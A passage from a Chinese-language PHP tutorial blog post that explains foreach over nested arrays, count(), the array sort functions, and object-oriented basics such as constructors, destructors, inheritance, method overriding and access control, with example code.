<p><font face="Comic sans MS">按照foreach的结果推理与刚刚做的关联数组的结果是一样的。<br>不同的是不连续的索引数组。每读一次数组的元素，将当次循环的下标赋值给了变量$k，值赋值给了变量$v。<font color="red"><strong>（即不像for循环一样的循环遍历）</strong></font> 每读将键和值输出，然后显示出来。循环一次向后移动一次下标。读取至最后，退出执行。<br></font></p>
<p>&amp;emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>4. foreach遍历遍历多维数组：</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">       <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;中国&#x27;</span> =&gt; <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;美国&#x27;</span> =&gt; <span class="string">&#x27;usa&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;德国&#x27;</span> =&gt; <span class="string">&#x27; Germany&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">       <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">&#x27;湖北&#x27;</span> =&gt; <span class="string">&#x27;hubei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;河北&#x27;</span> =&gt; <span class="string">&#x27;hebei&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山东&#x27;</span> =&gt; <span class="string">&#x27;shandong&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;山西&#x27;</span> =&gt; <span class="string">&#x27;sanxi&#x27;</span>,</span><br><span class="line">       ),</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注：我们在使用foreach循环时，第一次循环将键为0和键为1的两个数组赋值给一个变量($value)。然后，</span></span><br><span class="line"><span class="comment">//再套一个循环遍历这个$value变量，$value中的值取出来，赋值给$k和$v。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//第一次循环把国家的数组赋值给了$value</span></span><br><span class="line">   <span class="comment">//第二次循环把中国的省份的数组又赋值给了$value</span></span><br><span class="line">   <span class="comment">//因此，我在循环的时候把$value再遍历一次</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">foreach</span>(<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$k</span> . <span class="string">&#x27;-----&#x27;</span> . <span class="variable">$v</span> .<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//为了看的更清晰，我在中间加上华丽丽的分割线方便你来分析</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;----------分割线-----------&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结：</strong></p>
</blockquote>
<ol>
<li>第一次循环的时候，将数组赋值给了$value，然后用foreach循环$value。将二维的子数组中的键给到$k，值赋值给变量$v。</li>
<li>第一次循环退出子数组的循环，执行后续代码显示分割线。</li>
<li>依此类推，第二次循环也是这样。</li>
</ol>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 统计数组元素个数</strong></font><br>数组是我们最常用到的类型，那如何计算某个一维数组的个数呢。其实我们可以用到我们之前学过的数学函数里面的一个：<font color="#00B2EE"><strong>count()</strong></font>。<br><font color="#FF7F00">count($变量)</font> 函数用于返回数组的长度（元素数）：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$name</span>=Array(<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;andy&#x27;</span>,<span class="string">&#x27;jack&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> count(<span class="variable">$name</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. PHP 数组排序</strong></font><br>数组中的元素可以按字母或数字顺序进行降序或升序排列。<br>升序：从小到大的顺序进行排序，如果是英文单词，那么按字母A-Za-z的顺序排序，如果是数字，那么按数字的大小进行排序。<br>降序：与升序相反</p>
<p>   sort() - 对数组进行升序排列<br>   rsort() - 对数组进行降序排列<br>   asort() - 根据关联数组的值，对数组进行升序排列<br>   ksort() - 根据关联数组的键，对数组进行升序排列<br>   arsort() - 根据关联数组的值，对数组进行降序排列<br>   krsort() - 根据关联数组的键，对数组进行降序排列<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 数组函数</strong></font><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_array.asp">PHP 数组函数</a>]</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-PHP-命名空间"><a href="#1-7-PHP-命名空间" class="headerlink" title="1.7 PHP 命名空间"></a><font color="#3CB371" face="Comic sans MS">1.7 PHP 命名空间</font></h4><p><font face="Comic sans MS"><font color="red"><strong>[<a href="https://directoree.github.io/post/PHP-namespace">参见本站博客：PHP-命名空间</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-8-PHP-面向对象"><a href="#1-8-PHP-面向对象" class="headerlink" title="1.8 PHP 面向对象"></a><font color="#3CB371" face="Comic sans MS">1.8 PHP 面向对象</font></h4><ul>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>类：</strong></font>  定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>对象：</strong></font>  是类的实例。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员变量：</strong></font>  定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>成员函数：</strong></font>  定义在类的内部，可用于访问对象的数据。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>继承：</strong></font>  继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>父类：</strong></font>  一个类被其他类继承，可将该类称为父类，或基类，或超类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>子类：</strong></font>  一个类继承其他类称为子类，也可称为派生类。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>多态：</strong></font>  多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>重载：</strong></font>  简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>抽象性：</strong></font>  抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>封装：</strong></font> 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>构造函数：</strong></font>  主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</font></li>
<li>[ ]<font face="Comic sans MS"><font color="red"><strong>析构函数：</strong></font>  析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</font></li>
</ul>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>1. 构造函数</strong></font><br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。<br> PHP 5 允行开发者在一个类中定义一个方法作为构造函数，语法格式如下：<br><font color="#00B2EE"> void  __construct ([ mixed $args [, $… ]] )</font><br> 在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$par1</span>, <span class="variable">$par2</span> </span>) </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = <span class="variable">$par1</span>;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* 成员变量 */</span></span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$url</span>;</span><br><span class="line">     <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/* 成员函数 */</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = <span class="variable">$par</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"> <span class="variable">$par1</span>, <span class="variable">$par2</span> </span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;url = <span class="variable">$par1</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line"> <span class="variable">$php</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.php.cn&#x27;</span>, <span class="string">&#x27;php中文网&#x27;</span>);</span><br><span class="line"> <span class="variable">$taobao</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.taobao.com&#x27;</span>, <span class="string">&#x27;淘宝&#x27;</span>);</span><br><span class="line"> <span class="variable">$google</span> = <span class="keyword">new</span> Site(<span class="string">&#x27;www.google.com&#x27;</span>, <span class="string">&#x27;Google 搜索&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line"> <span class="variable">$php</span>-&gt;getTitle();</span><br><span class="line"> <span class="variable">$taobao</span>-&gt;getTitle();</span><br><span class="line"> <span class="variable">$google</span>-&gt;getTitle();</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$php</span>-&gt;getUrl();</span><br><span class="line"> <span class="variable">$taobao</span>-&gt;getUrl();</span><br><span class="line"> <span class="variable">$google</span>-&gt;getUrl();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. 析构函数</strong></font><br>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;构造函数\n&quot;</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;MyDestructableClass&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;销毁 &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 继承</strong></font><br>PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 子类扩展站点类别</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$category</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setCate</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;category = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getCate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;category . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>4. 方法重写</strong></font><br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>下面的例中重写了 getUrl 与 getTitle 方法：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 访问控制</strong></font><br>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。<br><font color="#00B2EE"><strong>public（公有）：</strong></font>公有的类成员可以在任何地方被访问。<br><font color="#00B2EE"><strong>protected（受保护）：</strong></font>受保护的类成员则可以被其自身以及其子类和父类访问。<br><font color="#00B2EE"><strong>private（私有）：</strong></font>私有的类成员则只能被其定义所在的类访问。</p>
<p><font color="red"><strong>(1) 属性的访问控制</strong></font><br>类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$public</span> = <span class="string">&#x27;Public&#x27;</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$protected</span> = <span class="string">&#x27;Protected&#x27;</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$private</span> = <span class="string">&#x27;Private&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> MyClass();</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$obj</span>-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$protected</span> = <span class="string">&#x27;Protected2&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">printHello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span><br><span class="line">         <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$obj2</span> = <span class="keyword">new</span> MyClass2();</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;public; <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;private; <span class="comment">// 未定义 private</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$obj2</span>-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>(2) 方法的访问控制</strong></font><br>类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。<br></font></p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 声明一个公有的构造函数</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个公有的方法</span></span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个受保护的方法</span></span><br><span class="line">     <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个私有的方法</span></span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myclass</span> = <span class="keyword">new</span> MyClass;</span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myclass2</span> = <span class="keyword">new</span> MyClass2;</span><br><span class="line"> <span class="variable">$myclass2</span>-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="variable">$myclass2</span>-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myFoo</span> = <span class="keyword">new</span> foo();</span><br><span class="line"> <span class="variable">$myFoo</span>-&gt;test(); <span class="comment">// Bar::testPrivate</span></span><br><span class="line"> <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. 接口</strong></font><br>使用<font color="#00B2EE"><strong>接口（interface）</strong></font>，可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。<br>接口是通过 interface关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。<br>接口中定义的所有方法都必须是公有，这是接口的特性。<br>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。<br></font> </p>
<p>示例代码：</p>
